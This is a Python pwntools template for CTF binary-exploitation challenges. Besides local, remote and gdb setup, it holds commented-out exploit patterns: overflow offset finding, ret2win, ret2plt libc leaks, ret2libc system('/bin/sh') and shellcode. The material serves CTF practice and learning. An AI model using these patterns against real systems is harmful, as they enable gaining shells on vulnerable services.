#!/usr/bin/env python3
"""
pwn-template.py - pwntools exploit boilerplate for CTF pwn challenges.

Usage:
    python3 pwn-template.py --local                          # run the binary locally
    python3 pwn-template.py --local --gdb                    # attach gdb on start
    python3 pwn-template.py --remote --host x.ctf.io --port 1337
    DEBUG=1 python3 pwn-template.py --local                  # byte-level logging

Copy this file next to the challenge binary, set the CONFIG block, then work
inside exploit(). Everything below is designed to be deleted/commented freely.
"""

import argparse
import os
import sys

from pwn import ELF, ROP, args as pwn_args
from pwn import (  # noqa: F401  (imported for interactive use in exploit())
    context, remote, process, gdb, log,
    p8, p16, p32, p64, u8, u16, u32, u64,
    flat, pack, unpack, cyclic, cyclic_find, fit, asm, shellcraft,
)

# ---------------------------------------------------------------- CONFIG
HOST = ""                    # remote host, or pass --host
PORT = 0                     # remote port, or pass --port
LOCAL_BIN = "./chall"        # path to the challenge binary
LOCAL_LIBC = ""              # e.g. "./libc.so.6" if the challenge ships one
LOCAL_LD = ""                # e.g. "./ld-linux-x86-64.so.2" (use with LOCAL_LIBC)

# ---------------------------------------------------------------- SETUP


def parse_args():
    p = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    mode = p.add_mutually_exclusive_group()
    mode.add_argument("--local", action="store_true", help="run the binary locally (default)")
    mode.add_argument("--remote", action="store_true", help="connect to the remote service")
    p.add_argument("--host", default=HOST, help="remote host")
    p.add_argument("--port", type=int, default=PORT, help="remote port")
    p.add_argument("--gdb", action="store_true", help="gdb.attach at start (local only)")
    return p.parse_args()


cli = parse_args()

context.log_level = "debug" if os.environ.get("DEBUG") else "info"
context.binary = elf = ELF(LOCAL_BIN, checksec=False)
libc = ELF(LOCAL_LIBC, checksec=False) if LOCAL_LIBC and os.path.exists(LOCAL_LIBC) else None
rop = ROP(elf)

# GDB script used with --gdb. Common picks:
#   b main                  - stop at main
#   b *0x401234             - stop at an address
#   b *$rebase(0x1234)      - stop at a static-BINARY offset when PIE is on
#   set follow-fork-mode child   - for fork()ing servers
GDBSCRIPT = """
b main
continue
"""


def start():
    """Return a tube to the challenge, local or remote."""
    if cli.remote:
        if not cli.host or not cli.port:
            log.failure("remote mode needs --host and --port")
            sys.exit(1)
        return remote(cli.host, cli.port)

    if not os.path.exists(LOCAL_BIN):
        log.failure(f"binary not found: {LOCAL_BIN}")
        sys.exit(1)

    argv = [LOCAL_BIN]
    kwargs = {}
    if LOCAL_LIBC:
        libc_path = os.path.abspath(LOCAL_LIBC)
        if LOCAL_LD and os.path.exists(LOCAL_LD):
            # Cleanest: run with the challenge's own loader
            argv = [os.path.abspath(LOCAL_LD), "--library-path",
                    os.path.dirname(libc_path), os.path.abspath(LOCAL_BIN)]
        else:
            # Works for most challenges; see also: pwninit / patchelf
            kwargs["env"] = {"LD_PRELOAD": libc_path}

    io = process(argv, **kwargs)
    if cli.gdb:
        gdb.attach(io, gdbscript=GDBSCRIPT)
    return io


# ---------------------------------------------------------------- HELPERS
# send/recv shorthands - keeps exploit bodies readable
def ru(io, d): return io.recvuntil(d)
def sla(io, d, s): return io.sendlineafter(d, s)
def sa(io, d, s): return io.sendafter(d, s)
def sl(io, s): return io.sendline(s)


def leak64(io, n=6):
    """Read n bytes, pad to 8, unpack - the usual truncated-address leak."""
    return u64(io.recv(n).ljust(8, b"\x00"))


# ---------------------------------------------------------------- EXPLOIT
def exploit():
    io = start()

    # === PATTERN 1: find the overflow offset ===
    # io = start()
    # sla(io, b": ", cyclic(200))
    # io.wait()
    # core = io.corefile
    # offset = cyclic_find(core.read(core.rsp, 4))
    # log.success(f"offset: {offset}")
    # sys.exit()

    # === PATTERN 2: ret2win ===
    # padding = cyclic(cyclic_find(0x6161616c))   # fill to the offset you found
    # payload = padding + p64(elf.symbols["win"])
    # sla(io, b"> ", payload)

    # === PATTERN 3: ret2plt to leak a libc address (PIE/ASLR) ===
    # rop.call(elf.plt["puts"], [elf.got["puts"]])
    # rop.call(elf.symbols["main"])               # re-enter for stage 2
    # sla(io, b"> ", cyclic(OFFSET) + rop.chain())
    # leaked = leak64(io)
    # libc.address = leaked - libc.symbols["puts"]
    # log.success(f"libc base: {libc.address:#x}")

    # === PATTERN 4: ret2libc system("/bin/sh") ===
    # rop2 = ROP(libc)
    # rop2.call("system", [next(libc.search(b"/bin/sh\x00"))])
    # sla(io, b"> ", cyclic(OFFSET) + rop2.chain())

    # === PATTERN 5: shellcode (only if NX is off) ===
    # sc = asm(shellcraft.sh())
    # sla(io, b"> ", sc.ljust(OFFSET, b"\x90") + p64(buf_addr))

    io.interactive()  # keep at the end - hands you the shell


if __name__ == "__main__":
    exploit()
